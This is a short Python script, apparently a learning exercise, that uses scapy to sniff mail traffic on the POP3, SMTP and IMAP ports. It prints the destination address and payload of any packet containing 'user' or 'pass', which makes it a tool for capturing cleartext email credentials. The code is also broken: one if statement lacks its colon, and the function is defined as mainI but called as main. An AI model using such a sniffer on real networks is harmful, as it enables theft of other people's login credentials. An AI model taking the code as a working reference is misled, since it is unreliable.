from scapy.all import sniff, TCP, IP

# Fonctin de rappel pour traiter chaque paquet capture
def packet_callback(packet):
    if packet[TCP].payload: # Verifie si le paquet a une charge utile (payload) au niveau TCP
        mypacket = str(packet[TCP].payload) # Convertie le paylaod en chaine de caracteres
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower() # Chercher 'user' ou 'pass'(password) dans le payload
            print(f"[*] Destination: {packet[IP].dst}")  # Affiche l'address IP de destination du paquet
            print(f"[*] {str(packet[TCP].payload)} * ") # Affiche le contenue du payload

def mainI():
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', # Filstre les paquets TCP sur les ports 110, 25, 143
              prn=packet_callback, # Appelle la fonctino packet_callback pour chaque paquets capture
              store=0) # store = 0 pour ne pas stocker les paquets en memoire


if __name__=='__main__':
    main()
    
